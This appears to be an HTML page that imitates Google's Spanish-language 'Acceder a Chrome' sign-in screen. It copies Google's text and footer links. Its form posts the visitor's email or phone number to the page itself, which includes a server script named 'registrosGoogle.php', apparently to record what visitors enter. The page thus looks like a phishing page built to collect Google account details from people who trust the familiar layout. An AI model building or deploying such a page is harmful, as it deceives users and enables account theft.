<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="/Styles/styles.css" />
  <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=M+PLUS+1p&display=swap" rel="stylesheet" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&display=swap" rel="stylesheet" />
  <title>Formulario</title>
</head>

<body>
  <header>
    <div class="navbar"></div>
  </header>
  <main class="portada">
    <section class="flex-container-1">
      <div>
        <h4 class="titulo">Acceder a Chrome</h4>
      </div>
      <div class="google"></div>
      <section>
        <div>
          <a href="#">
            <h6 class="pregunta-correo">
              ¿Has olvidado tu correo electrónico?
            </h6>
          </a>
          <h6 class="texto-2">
            ¿Esta no es tu computadora? Usa el modo de invitado para navegar
            de forma privada.
            <a target="_blank" class="mas-informacion" href="https://support.google.com/chrome/answer/6130773?hl=es">Más
              informacion</a>
          </h6>
        </div>
      </section>
        <form method="post"> 
          <label for="input" id="correo" class="etiqueta-correo" onclick="changeColor()">
            <input id="input" class="input-correo" name="email" type="email"
              placeholder="Correo electronico o teléfono" />
          </label>
          <section class="botones">
          <button name="register" type="submit" class="siguiente">Siguiente</button>
          <div class="contenedor-select" id="contenedor-select">
          <div class="crear-cuenta" onclick="cambiarOpcion()" onclick="changesColor()" id="desencadenante">Crear Cuenta</div>
        </section>
        </form>
        <div class="opciones-contenedor" id="opciones-contenedor">
          <div class="option-2" onclick="selectOptions('Para uso personal')">Para uso personal</div>
          <div class="option-2" onclick="selectOptions('Para mi hijo o hija')">Para mi hijo o hija</div>
          <div class="option-2" onclick="selectOptions('Para trabajo o mi negocio')">Para trabajo o mi negocio</div>
        </div>
        </div>
      </section>
      </div>
    </section>
    <section class="flex-container-2">
      <div class="custom-select" id="customSelect">
        <div class="select-trigger" onclick="toggleOptions()" onclick="changesColor()" id="toggleOptions">
          Español(Latinoamerica)</div>
        <div class="options-container" id="optionsContainer">
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('English(United States)')">English(United States)</div>
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('Portugues(Portugal)')">Portugues(Portugal)</div>
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('Portugues(Portugal)')">Portugues(Portugal)</div>
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('Portugues(Portugal)')">Portugues(Portugal)</div>
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('Portugues(Portugal)')">Portugues(Portugal)</div>
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('Portugues(Portugal)')">Portugues(Portugal)</div>
          <div class="option" onclick="selectOption('Español(España)')">Español(España)</div>
          <div class="option" onclick="selectOption('Portugues(Brasil)')">Portugues(Brasil)</div>
          <div class="option" onclick="selectOption('Portugues(Portugal)')">Portugues(Portugal)</div>
        </div>
      </div>
      <div class="ayuda"><a target="_blank"
          href="https://support.google.com/accounts?hl=es-419&visit_id=638353130122803055-561652335&rd=2&p=account_iph#topic=3382296">Ayuda</a>
      </div>
      <div class="privacidad"><a target="_blank"
          href="https://policies.google.com/privacy?gl=AR&hl=es-419">Privacidad</a></div>
      <div class="condiciones"><a target="_blank"
          href="https://policies.google.com/terms?gl=AR&hl=es-419">Condiciones</a></div>
    </section>
  </main>
  <?php
        include('registrosGoogle.php');
        ?>  
  <script src="/Source/interactivity.js"></script>
</body>

</html>